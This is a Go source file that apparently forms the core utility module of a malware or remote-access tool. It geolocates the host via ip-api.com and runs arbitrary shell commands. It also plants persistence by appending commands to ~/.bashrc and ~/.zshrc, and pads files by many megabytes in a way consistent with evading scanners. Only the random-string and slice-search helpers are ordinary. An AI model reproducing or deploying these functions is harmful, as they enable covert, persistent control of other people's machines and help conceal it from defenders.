package core

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"reflect"
	"strings"
)

func GEOIP() (bool, string, string, string, string, string) {
	res, err := http.Get("http://ip-api.com/json/")
	if err != nil {
		return false, "", "", "", "", ""
	}
	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return false, "", "", "", "", ""
	}
	res.Body.Close()
	dec := json.NewDecoder(strings.NewReader(string(data)))
	var values IPApi
	err = dec.Decode(&values)
	if err != nil {
		return false, "", "", "", "", ""
	}
	return true, values.Country, values.Region, values.City, values.ISP, values.ORG
}

func run(stdout, stderr io.Writer, cmd string, args ...string) error {
	c := exec.Command(cmd, args...)
	c.Stdin = os.Stdin
	c.Stdout = stdout
	c.Stderr = stderr
	return c.Run()
}

func RunCmd(cmd string) (string, bool) {
	execcmd := exec.Command("/bin/sh", "-c", cmd)
	cmdout, err := execcmd.Output()
	if err != nil {
		return "", false
	}
	return string(cmdout), true
}

func PersistentCommand(cmd string) bool {
	_, b := RunCmd(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	return b
}

func RandomString(length int) string {
	chars := []rune("QAZWSXXEDCRFVTGBYHNUJMIKOLP" + "qazwsxedcrfvtgbyhnujmikolp" + "0123456789")
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	return b.String()
}

func BytePump(file string, size int) {
	var wantedSize = int64(size * 1024 * 1024) //Makes a MB
	fi, _ := os.Stat(file)

	toPump, err := os.OpenFile(file, os.O_RDWR, 0644)
	if err != nil {
		//log.Fatalf("Error Opening File: %s", err)
	}
	defer toPump.Close()

	_, err = toPump.WriteAt([]byte{0}, fi.Size()+wantedSize)
	if err != nil {
		//log.Fatalf("Error Writing to File: %s", err)
	}
}

func Contains(s interface{}, elem interface{}) bool {
	arrV := reflect.ValueOf(s)
	if arrV.Kind() == reflect.Slice {
		for i := 0; i < arrV.Len(); i++ {
			if arrV.Index(i).Interface() == elem {
				return true
			}
		}
	}
	return false
}
